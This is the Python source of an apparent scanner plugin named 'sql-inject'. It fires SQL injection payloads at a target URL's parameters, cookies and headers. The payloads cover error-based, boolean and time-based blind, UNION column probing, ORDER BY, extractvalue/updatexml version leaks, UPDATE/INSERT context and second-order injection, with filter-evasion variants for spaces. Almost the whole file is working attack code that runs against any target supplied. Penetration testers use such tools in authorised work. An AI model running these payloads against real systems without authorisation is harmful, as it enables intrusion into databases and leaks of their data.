import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from typing import Any, AsyncIterator

import httpx

from app.plugins.base import PluginBase, PluginEvent, PluginMeta

# SQL error signatures
SQL_ERRORS = [
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_",
    r"MySQLSyntaxErrorException",
    r"valid MySQL result",
    r"check the manual that corresponds to your (MySQL|MariaDB)",
    r"ORA-\d{5}",
    r"Oracle.*Driver",
    r"Microsoft.*SQL.*Server",
    r"ODBC.*SQL.*Server",
    r"SQLServer.*JDBC",
    r"Unclosed quotation mark",
    r"pg_query\(\).*ERROR",
    r"PostgreSQL.*ERROR",
    r"PSQLException",
    r"SQLite.*error",
    r"sqlite3\.OperationalError",
    r"SQLSTATE\[\w+\]",
    r"syntax error.*SQL",
    r"you have an error in your sql",
    r"XPATH syntax error",
    r"extractvalue",
    r"updatexml",
    r"Duplicate entry.*for key",
]
SQL_ERROR_RE = re.compile("|".join(SQL_ERRORS), re.IGNORECASE)


class SqlInject(PluginBase):
    meta = PluginMeta(
        name="sql-inject",
        version="2.0.0",
        description="SQL 注入检测",
        category="vuln",
        engine="python",
    )

    async def execute(self, params: dict[str, Any]) -> AsyncIterator[PluginEvent]:
        url = params["url"].strip()
        method = params.get("method", "GET").upper()
        post_data = params.get("post_data", "").strip()
        cookie = params.get("cookie", "").strip()
        user_agent = params.get("user_agent", "").strip()
        referer = params.get("referer", "").strip()
        xff = params.get("x_forwarded_for", "").strip()
        trigger_url = params.get("trigger_url", "").strip()
        space_bypass = params.get("space_bypass", "false").lower() == "true"
        timeout = int(params.get("timeout", 10))

        yield PluginEvent(type="log", data={"msg": f"SQL injection scan: {method} {url}"})
        if space_bypass:
            yield PluginEvent(type="log", data={"msg": "Space bypass mode: ON"})
        yield PluginEvent(type="progress", data={"percent": 0, "msg": "Preparing..."})

        # ── Collect injection points ──
        injection_points: list[tuple[str, str]] = []
        if "*" in url:
            injection_points.append(("url", url))
        if "*" in post_data:
            injection_points.append(("body", post_data))
        if "*" in cookie:
            injection_points.append(("cookie", cookie))
        if "*" in user_agent:
            injection_points.append(("user-agent", user_agent))
        if "*" in referer:
            injection_points.append(("referer", referer))
        if "*" in xff:
            injection_points.append(("x-forwarded-for", xff))

        # Auto-detect GET params if no markers
        if not injection_points:
            parsed = urlparse(url)
            qs = parse_qs(parsed.query, keep_blank_values=True)
            for pname in qs:
                mqs = dict(qs)
                mqs[pname] = [qs[pname][0] + "*"]
                new_query = urlencode(mqs, doseq=True)
                new_url = urlunparse(parsed._replace(query=new_query))
                injection_points.append(("url", new_url))

        if not injection_points:
            yield PluginEvent(type="log", data={"msg": "No injection points found. Use * to mark."})
            yield PluginEvent(type="progress", data={"percent": 100, "msg": "No injection points"})
            return

        num_tests = 10
        total = len(injection_points) * num_tests
        done = 0
        found = 0

        ctx = _Ctx(url, post_data, cookie, user_agent, referer, xff)

        async with httpx.AsyncClient(timeout=timeout, verify=False) as client:
            for position, target in injection_points:
                pname = self._param_name(position, target)
                yield PluginEvent(type="log", data={"msg": f"\n{'='*50}"})
                yield PluginEvent(type="log", data={"msg": f"Target: {pname} ({position})"})

                # Baseline
                try:
                    baseline = await self._fire(client, method, ctx, position, target, "")
                except Exception as e:
                    yield PluginEvent(type="log", data={"msg": f"  Baseline failed: {e}"})
                    done += num_tests
                    continue
                bl = len(baseline.text)

                # Helper closures
                async def send(payload: str):
                    return await self._fire(client, method, ctx, position, target, payload)

                def result(typ, payload, evidence):
                    nonlocal found
                    found += 1
                    return PluginEvent(type="result", data={
                        "param": pname, "position": position,
                        "type": typ, "payload": payload, "evidence": evidence,
                    })

                # ── 1. Error-based (basic) ──
                yield PluginEvent(type="log", data={"msg": "  [1/10] Error-based..."})
                for p in self._bp(["'", '"', "\\", "')", "';", "1'", "1\""], space_bypass):
                    try:
                        r = await send(p)
                        m = SQL_ERROR_RE.search(r.text)
                        if m:
                            yield result("Error-based", p, m.group()[:120])
                            yield PluginEvent(type="log", data={"msg": f"  [VULN] Error-based: {p}"})
                            break
                    except Exception:
                        pass
                done += 1

                # ── 2. Integer / AND-OR ──
                yield PluginEvent(type="log", data={"msg": "  [2/10] Integer AND/OR..."})
                and_or_pairs = [
                    ("1 AND 1=1", "1 AND 1=2", "Integer (AND)"),
                    ("1 OR 1=1", "1 OR 1=2", "Integer (OR)"),
                    ("-1 OR 1=1", "-1 OR 1=2", "Integer (OR neg)"),
                    ("1 AND 1=1#", "1 AND 1=2#", "AND (hash comment)"),
                    ("1 AND 1=1-- ", "1 AND 1=2-- ", "AND (dash comment)"),
                ]
                for tp, fp, label in and_or_pairs:
                    for t, f in zip(self._bp([tp], space_bypass), self._bp([fp], space_bypass)):
                        try:
                            rt = await send(t)
                            rf = await send(f)
                            diff = abs(len(rt.text) - len(rf.text))
                            if diff > 50:
                                yield result(label, f"{t} / {f}",
                                             f"True={len(rt.text)} False={len(rf.text)} diff={diff}")
                                yield PluginEvent(type="log", data={"msg": f"  [VULN] {label}: diff={diff}"})
                                break
                        except Exception:
                            pass
                    else:
                        continue
                    break
                done += 1

                # ── 3. String / Boolean blind ──
                yield PluginEvent(type="log", data={"msg": "  [3/10] String Boolean blind..."})
                str_pairs = [
                    ("' OR '1'='1", "' OR '1'='2"),
                    ("' OR 1=1-- ", "' OR 1=2-- "),
                    ("' OR 1=1#", "' OR 1=2#"),
                    ("\" OR \"1\"=\"1", "\" OR \"1\"=\"2"),
                    ("') OR ('1'='1", "') OR ('1'='2"),
                    ("') OR 1=1-- ", "') OR 1=2-- "),
                ]
                for tp, fp in str_pairs:
                    for t, f in zip(self._bp([tp], space_bypass), self._bp([fp], space_bypass)):
                        try:
                            rt = await send(t)
                            rf = await send(f)
                            diff = abs(len(rt.text) - len(rf.text))
                            if diff > 50:
                                yield result("String (Boolean blind)", f"{t} / {f}",
                                             f"True={len(rt.text)} False={len(rf.text)} diff={diff}")
                                yield PluginEvent(type="log", data={"msg": f"  [VULN] Boolean blind: diff={diff}"})
                                break
                        except Exception:
                            pass
                    else:
                        continue
                    break
                done += 1

                # ── 4. Time-based blind ──
                yield PluginEvent(type="log", data={"msg": "  [4/10] Time-based blind..."})
                time_payloads = [
                    "1 AND SLEEP(3)-- ",
                    "' AND SLEEP(3)-- ",
                    "' AND SLEEP(3)#",
                    "1) AND SLEEP(3)-- ",
                    "') AND SLEEP(3)-- ",
                    "1;WAITFOR DELAY '0:0:3'-- ",
                    "' OR pg_sleep(3)-- ",
                ]
                for p in self._bp(time_payloads, space_bypass):
                    try:
                        t0 = time.monotonic()
                        await send(p)
                        elapsed = time.monotonic() - t0
                        if elapsed >= 2.5:
                            yield result("Time blind", p, f"Delayed {elapsed:.1f}s")
                            yield PluginEvent(type="log", data={"msg": f"  [VULN] Time blind: {elapsed:.1f}s"})
                            break
                    except Exception:
                        pass
                done += 1

                # ── 5. UNION injection ──
                yield PluginEvent(type="log", data={"msg": "  [5/10] UNION injection..."})
                union_hit = False
                for cols in range(1, 16):
                    nulls = ",".join(["NULL"] * cols)
                    candidates = [
                        f"' UNION SELECT {nulls}-- ",
                        f"' UNION SELECT {nulls}#",
                        f" UNION SELECT {nulls}-- ",
                        f"') UNION SELECT {nulls}-- ",
                        f"\" UNION SELECT {nulls}-- ",
                    ]
                    for p in self._bp(candidates, space_bypass):
                        try:
                            r = await send(p)
                            if r.status_code == 200 and not SQL_ERROR_RE.search(r.text):
                                if abs(len(r.text) - bl) > 10:
                                    yield result("UNION injection", p, f"{cols} columns")
                                    yield PluginEvent(type="log", data={"msg": f"  [VULN] UNION: {cols} cols"})
                                    union_hit = True
                                    break
                        except Exception:
                            pass
                    if union_hit:
                        break
                done += 1

                # ── 6. ORDER BY injection ──
                yield PluginEvent(type="log", data={"msg": "  [6/10] ORDER BY injection..."})
                ob_pairs = [
                    ("1 ORDER BY 1-- ", "1 ORDER BY 9999-- "),
                    ("' ORDER BY 1-- ", "' ORDER BY 9999-- "),
                    ("' ORDER BY 1#", "' ORDER BY 9999#"),
                    ("') ORDER BY 1-- ", "') ORDER BY 9999-- "),
                ]
                for low, high in ob_pairs:
                    for l, h in zip(self._bp([low], space_bypass), self._bp([high], space_bypass)):
                        try:
                            rl = await send(l)
                            rh = await send(h)
                            low_ok = rl.status_code == 200 and not SQL_ERROR_RE.search(rl.text)
                            high_err = SQL_ERROR_RE.search(rh.text) or rh.status_code != 200
                            if low_ok and high_err:
                                yield result("ORDER BY injection", f"{l} / {h}",
                                             "ORDER BY 1 OK, ORDER BY 9999 error")
                                yield PluginEvent(type="log", data={"msg": "  [VULN] ORDER BY injection"})
                                break
                        except Exception:
                            pass
                    else:
                        continue
                    break
                done += 1

                # ── 7. Error-based (extractvalue / updatexml) ──
                yield PluginEvent(type="log", data={"msg": "  [7/10] Error-based (XML functions)..."})
                xml_payloads = [
                    "' AND extractvalue(1,concat(0x7e,version()))-- ",
                    "' AND updatexml(1,concat(0x7e,version()),1)-- ",
                    "1 AND extractvalue(1,concat(0x7e,version()))-- ",
                    "1 AND updatexml(1,concat(0x7e,version()),1)-- ",
                    "' AND extractvalue(1,concat(0x7e,version()))#",
                    "') AND extractvalue(1,concat(0x7e,version()))-- ",
                ]
                for p in self._bp(xml_payloads, space_bypass):
                    try:
                        r = await send(p)
                        leak = re.search(r"~([\w.\-]+)", r.text)
                        if leak:
                            yield result("Error-based (XML)", p, f"Leaked: {leak.group()}")
                            yield PluginEvent(type="log", data={"msg": f"  [VULN] XML error: {leak.group()}"})
                            break
                        m = SQL_ERROR_RE.search(r.text)
                        if m:
                            yield result("Error-based (XML)", p, m.group()[:120])
                            yield PluginEvent(type="log", data={"msg": "  [VULN] XML error injection"})
                            break
                    except Exception:
                        pass
                done += 1

                # ── 8. UPDATE context ──
                yield PluginEvent(type="log", data={"msg": "  [8/10] UPDATE context..."})
                update_payloads = [
                    "' AND SLEEP(3) AND '1'='1",
                    "'+SLEEP(3)+'",
                    "' AND extractvalue(1,concat(0x7e,version())) AND '1'='1",
                    "' WHERE 1=1 AND SLEEP(3)-- ",
                    "',username=(SELECT version()) WHERE '1'='1",
                ]
                for p in self._bp(update_payloads, space_bypass):
                    try:
                        t0 = time.monotonic()
                        r = await send(p)
                        elapsed = time.monotonic() - t0
                        if elapsed >= 2.5:
                            yield result("UPDATE context (time)", p, f"Delayed {elapsed:.1f}s in SET")
                            yield PluginEvent(type="log", data={"msg": f"  [VULN] UPDATE time: {elapsed:.1f}s"})
                            break
                        leak = re.search(r"~([\w.\-]+)", r.text)
                        if leak:
                            yield result("UPDATE context (error)", p, f"Leaked: {leak.group()}")
                            yield PluginEvent(type="log", data={"msg": f"  [VULN] UPDATE error: {leak.group()}"})
                            break
                    except Exception:
                        pass
                done += 1

                # ── 9. INSERT context ──
                yield PluginEvent(type="log", data={"msg": "  [9/10] INSERT context..."})
                insert_payloads = [
                    "' AND SLEEP(3))-- ",
                    "',SLEEP(3))-- ",
                    "' AND extractvalue(1,concat(0x7e,version())))-- ",
                    "')-- ",
                    "','','')-- ",
                ]
                for p in self._bp(insert_payloads, space_bypass):
                    try:
                        t0 = time.monotonic()
                        r = await send(p)
                        elapsed = time.monotonic() - t0
                        if elapsed >= 2.5:
                            yield result("INSERT context (time)", p, f"Delayed {elapsed:.1f}s in VALUES")
                            yield PluginEvent(type="log", data={"msg": f"  [VULN] INSERT time: {elapsed:.1f}s"})
                            break
                        leak = re.search(r"~([\w.\-]+)", r.text)
                        if leak:
                            yield result("INSERT context (error)", p, f"Leaked: {leak.group()}")
                            yield PluginEvent(type="log", data={"msg": f"  [VULN] INSERT error: {leak.group()}"})
                            break
                        m = SQL_ERROR_RE.search(r.text)
                        if m and any(k in p for k in [")", "',", "extractvalue"]):
                            yield result("INSERT context (error)", p, m.group()[:120])
                            yield PluginEvent(type="log", data={"msg": "  [VULN] INSERT error injection"})
                            break
                    except Exception:
                        pass
                done += 1

                # ── 10. Second-order injection ──
                if trigger_url:
                    yield PluginEvent(type="log", data={"msg": "  [10/10] Second-order injection..."})
                    try:
                        trig_base = await client.request("GET", trigger_url)
                        trig_bl = len(trig_base.text)
                    except Exception:
                        trig_bl = 0
                    second_payloads = [
                        "admin'-- ",
                        "' OR 1=1-- ",
                        "' UNION SELECT 1,2,3-- ",
                        "\" OR \"\"=\"",
                    ]
                    for p in second_payloads:
                        try:
                            await send(p)
                            tr = await client.request("GET", trigger_url)
                            diff = abs(len(tr.text) - trig_bl)
                            err = SQL_ERROR_RE.search(tr.text)
                            if diff > 100 or err:
                                ev = f"SQL error in trigger: {err.group()[:80]}" if err else f"Trigger diff={diff}"
                                yield result("Second-order injection", p, ev)
                                yield PluginEvent(type="log", data={"msg": f"  [VULN] Second-order: {ev}"})
                                break
                        except Exception:
                            pass
                else:
                    yield PluginEvent(type="log", data={"msg": "  [10/10] Second-order: skipped (no trigger_url)"})
                done += 1

                pct = min(done * 100 // max(total, 1), 99)
                yield PluginEvent(type="progress", data={"percent": pct, "msg": f"Tested {done}/{total}"})

        summary = f"Scan complete: {found} vulnerabilities found across {len(injection_points)} points"
        yield PluginEvent(type="log", data={"msg": f"\n{summary}"})
        yield PluginEvent(type="progress", data={"percent": 100, "msg": summary})

    # ── Helpers ──

    def _bp(self, payloads: list[str], bypass: bool) -> list[str]:
        """Generate space-bypass variants."""
        if not bypass:
            return payloads
        out = list(payloads)
        for p in payloads:
            if " " in p:
                for rep in ["/**/", "%09", "%0a", "+"]:
                    out.append(p.replace(" ", rep))
        return out

    def _param_name(self, position: str, target: str) -> str:
        if position == "url":
            parsed = urlparse(target)
            qs = parse_qs(parsed.query, keep_blank_values=True)
            for k, v in qs.items():
                if v and "*" in v[0]:
                    return k
            return "url-path"
        elif position == "body":
            for pair in target.split("&"):
                if "*" in pair and "=" in pair:
                    return pair.split("=")[0]
        elif position == "cookie":
            for pair in target.split(";"):
                if "*" in pair and "=" in pair:
                    return pair.split("=")[0].strip()
        elif position in ("user-agent", "referer", "x-forwarded-for"):
            return position.upper()
        return position

    def _safe_hdr(self, value: str) -> str:
        """Percent-encode non-latin-1 characters so httpx can encode the header."""
        try:
            value.encode("latin-1")
            return value
        except UnicodeEncodeError:
            return quote(value, safe=r" !\"#$%&'()*+,-./:;<=>?@[\]^_`{|}~")

    def _build(self, ctx, position, target, payload):
        """Build (url, body, headers) with payload injected at position."""
        req_url = ctx.url.replace("*", "") if "*" in ctx.url else ctx.url
        req_body = ctx.post_data.replace("*", "") if ctx.post_data else None
        headers: dict[str, str] = {}
        if ctx.cookie:
            headers["Cookie"] = self._safe_hdr(ctx.cookie.replace("*", ""))
        if ctx.user_agent:
            headers["User-Agent"] = self._safe_hdr(ctx.user_agent.replace("*", ""))
        if ctx.referer:
            headers["Referer"] = self._safe_hdr(ctx.referer.replace("*", ""))
        if ctx.xff:
            headers["X-Forwarded-For"] = self._safe_hdr(ctx.xff.replace("*", ""))

        if position == "url":
            req_url = target.replace("*", payload)
        elif position == "body":
            req_body = target.replace("*", payload)
        elif position == "cookie":
            headers["Cookie"] = self._safe_hdr(target.replace("*", payload))
        elif position == "user-agent":
            headers["User-Agent"] = self._safe_hdr(target.replace("*", payload))
        elif position == "referer":
            headers["Referer"] = self._safe_hdr(target.replace("*", payload))
        elif position == "x-forwarded-for":
            headers["X-Forwarded-For"] = self._safe_hdr(target.replace("*", payload))

        return req_url, req_body, headers

    async def _fire(self, client, method, ctx, position, target, payload):
        req_url, req_body, headers = self._build(ctx, position, target, payload)
        return await client.request(method, req_url, content=req_body, headers=headers)


class _Ctx:
    """Simple container for base request parameters."""
    __slots__ = ("url", "post_data", "cookie", "user_agent", "referer", "xff")

    def __init__(self, url, post_data, cookie, user_agent, referer, xff):
        self.url = url
        self.post_data = post_data
        self.cookie = cookie
        self.user_agent = user_agent
        self.referer = referer
        self.xff = xff
